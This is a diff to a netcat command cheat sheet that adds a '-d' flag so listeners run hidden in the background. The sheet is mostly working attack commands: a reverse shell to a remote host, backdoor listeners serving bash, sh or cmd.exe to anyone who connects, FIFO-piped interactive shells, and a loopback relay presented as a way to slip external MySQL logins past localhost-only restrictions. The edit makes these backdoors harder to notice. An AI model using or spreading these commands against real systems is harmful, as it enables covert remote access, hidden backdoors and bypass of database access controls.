@@ -12,8 +12,10 @@ Useful netcat commands such as Reverse Shells, Port Relays via FIFO, and others 
 
 ### Listener ###
 Listen for inbound connection over TCP. This can be used to receive reverse shell sessions.
+
+To damonize use the `-d` flag, this will hide any GUI window.
 ```
-nc -lv -p [port]
+nc -l -d -v -p [port]
 ```
 ---
 
@@ -43,9 +45,9 @@ nc [host] [port] -e cmd.exe
 ### Backdoor Shells ###
 Same commands as before but in this case the target creates a listener which serves up a shell to anyone connecting on that `[port]`.
 ```
-nc -l -p [port] -e /bin/bash
-nc -l -p [port] -e /bin/sh
-nc -l -p [port] -e cmd.exe
+nc -l -d -p [port] -e /bin/bash
+nc -l -d -p [port] -e /bin/sh
+nc -l -d -p [port] -e cmd.exe
 ```
 ---
 
@@ -75,7 +77,7 @@ mknod [pipe-name] p
 
 Create a loopback which will relay traffic between `localhost:[Port-A]` and `localhost:[Port-B]` on the target, allowing inbound connections to `localhost:[Port-B]` to be directed at `[Port-A]`.
 ```
-nc -l -p [Port-B] 0< [pipe-name] | nc localhost [Port-A] 1> [pipe-name]
+nc -l -d -p [Port-B] 0< [pipe-name] | nc localhost [Port-A] 1> [pipe-name]
 ```
 First netcat is used to create a listener on `[Port-B]` which we will direct Stdin `0<` to the named-pipe. Then forward the output of this listener via the tranditional pipe to the netcat connection to `[Port-A]`. Direct whatever service is listening on `[Port-A]` Stdout `1>` to the named-pipe, which will send the response back through the listener.
 
@@ -83,7 +85,7 @@ First netcat is used to create a listener on `[Port-B]` which we will direct Std
 
 MySQL by default listens on Port 3306, this will fool mysqld into thinking the connecting user is `user@localhost`! Many web apps only permit users from localhost and communicate via loopback connections to backend databases while not exposing the port to the outside; this would bypass that allowing external mysql client sessions that appear to originate from localhost.
 
-Target: `nc -l -p [Port-B] 0< [pipe-name] | nc 127.0.0.1 3306 1> [pipe-name]`
+Target: `nc -l -d -p [Port-B] 0< [pipe-name] | nc 127.0.0.1 3306 1> [pipe-name]`
 
 Connection: `mysql --port [Port-B] --username=[user] --password=[passwd]`
 
@@ -92,9 +94,9 @@ Unfortunately the default `secure_mysql_installation` option "Prevent root from 
 
 FIFO's can also be used to connect to shells.
 ```
-nc -l -p [port] 0< [pipe-name] | bash -i 1> [pipe-name]
-nc -l -p [port] 0< [pipe-name] | sh -i 1> [pipe-name]
-nc -l -p [port] 0< [pipe-name] | python -i 1> [pipe-name]
+nc -l -d -p [port] 0< [pipe-name] | bash -i 1> [pipe-name]
+nc -l -d -p [port] 0< [pipe-name] | sh -i 1> [pipe-name]
+nc -l -d -p [port] 0< [pipe-name] | python -i 1> [pipe-name]
 ```
 ---
 
@@ -103,7 +105,7 @@ nc -l -p [port] 0< [pipe-name] | python -i 1> [pipe-name]
 ### File Transfer ###
 Files can be transmitted across a netcat session using Stdin/Stdout.
 
-Destination: `nc -l -p [port] > /path/to/file`
+Destination: `nc -l -d -p [port] > /path/to/file`
 
 Source: `nc [host] [port] < path/to/file`
 
